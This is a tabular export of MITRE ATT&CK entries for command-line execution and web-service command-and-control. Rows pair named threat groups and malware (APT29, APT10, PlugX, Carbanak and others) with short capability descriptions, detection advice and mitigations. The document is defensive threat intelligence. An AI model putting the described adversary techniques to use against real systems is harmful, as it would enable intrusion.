1026,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0086|ZLib]] has the ability to execute shell commands.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: ZLib,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1027,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['A module in [[Software/S0046|CozyCar]] allows arbitrary commands to be executed by invoking <code>C:\\Windows\\System32\\cmd.exe</code>.[[CiteRef::F-Secure CozyDuke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: CozyCar, CozyDuke, ...",['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1028,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0053|SeaDuke]] is capable of executing commands.[[CiteRef::Unit 42 SeaDuke 2015]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: SeaDuke, SeaDaddy, SeaDesk",['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1029,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0139|PowerDuke]] runs <code>cmd.exe /c</code> and sends the output to its C2.[[CiteRef::Volexity PowerDuke November 2016]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: PowerDuke,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1030,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0032|Lazarus Group]] malware uses cmd.exe to execute commands on victims.[[CiteRef::Novetta Blockbuster Destructive Malware]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],[],['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1031,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0013|PlugX]] allows actors to spawn a reverse shell on a victim.[[CiteRef::Dell TG-3390]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: PlugX, Sogu, Kaba",['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1032,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']","['An [[Group/G0022|APT3]] downloader uses the Windows command <code>""cmd.exe"" /C whoami</code>.[[CiteRef::FireEye Operation Double Tap]] The group also uses a tool to execute commands on remote computers.[[CiteRef::Symantec Buckeye]]']",['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],[],['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1033,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0013|PlugX]] allows actors to spawn a reverse shell on a victim.[[CiteRef::Dell TG-3390]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: PlugX, Sogu, Kaba",['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1034,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0153|RedLeaves]] can receive and execute commands with cmd.exe.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]] It can also provide a reverse shell.[[CiteRef::FireEye APT10 April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: RedLeaves, BUGJUICE",['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1035,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0106|cmd]] is used to execute programs and other actions at the command-line interface.[[CiteRef::TechNet Cmd]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: cmd, cmd.exe",['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1036,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0159|SNUGRIDE]] is capable of executing commands and spawning a reverse shell.[[CiteRef::FireEye APT10 April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: SNUGRIDE,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1037,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0045|menuPass]] executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands.[[CiteRef::PWC Cloud Hopper April 2017]][[CiteRef::PWC Cloud Hopper Technical Annex April 2017]][[CiteRef::Github AD-Pentest-Script]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],[],['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1038,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0040|Patchwork]] ran a reverse shell with Meterpreter.[[CiteRef::Cymmetria Patchwork]]'],['Patchwork'],"['Patchwork', 'Dropping Elephant', 'Chinastrats']",['G0040'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],[],['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1039,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0013|PlugX]] allows actors to spawn a reverse shell on a victim.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: PlugX, Sogu, Kaba",['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1040,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0070|HTTPBrowser]] is capable of spawning a reverse shell on a victim.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: HTTPBrowser, Token Control, HttpDump",['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1041,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0020|China Chopper]] is capable of opening a command terminal.[[CiteRef::SecureWorks BRONZE UNION June 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: China Chopper,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1042,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0027|Threat Group-3390]] has used command-line interfaces for execution.[[CiteRef::SecureWorks BRONZE UNION June 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],[],['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1043,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']","['[[Group/G0008|Carbanak]] has used a VBScript named ""ggldr"" that uses Google Apps Script, Sheets, and Forms services for C2.[[CiteRef::Forcepoint Carbanak Google C2]]']",['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Command and Control'],['Technique/T1102'],['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
1044,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']","['[[Software/S0128|BADNEWS]] can use multiple C2 channels, including RSS feeds, Github, forums, and blogs.[[CiteRef::Forcepoint Monsoon]]']",['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: BADNEWS,['Command and Control'],['Technique/T1102'],['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
1045,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']",[u'[[Software/S0069|BLACKCOFFEE]] uses Microsoft\u2019s TechNet Web portal to obtain an encoded tag containing the IP address of a command and control server.[[CiteRef::FireEye APT17]]'],['APT17'],"['APT17', 'Deputy Dog']",['G0025'],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: BLACKCOFFEE,['Command and Control'],['Technique/T1102'],['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
1046,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']",['The [[Software/S0025|CALENDAR]] malware communicates through the use of events in Google Calendar.[[CiteRef::Mandiant APT1 Appendix]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: CALENDAR,['Command and Control'],['Technique/T1102'],['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
1047,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']",['[[Software/S0026|GLOOXMAIL]] communicates to servers operated by Google using the Jabber/XMPP protocol.[[CiteRef::Mandiant APT1]][[CiteRef::CyberESI GTALK]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: GLOOXMAIL, Trojan.GTALK",['Command and Control'],['Technique/T1102'],['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
1048,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']",['[[Group/G0048|RTM]] has used an RSS feed on Livejournal to update a list of encrypted C2 server names.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Command and Control'],['Technique/T1102'],['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
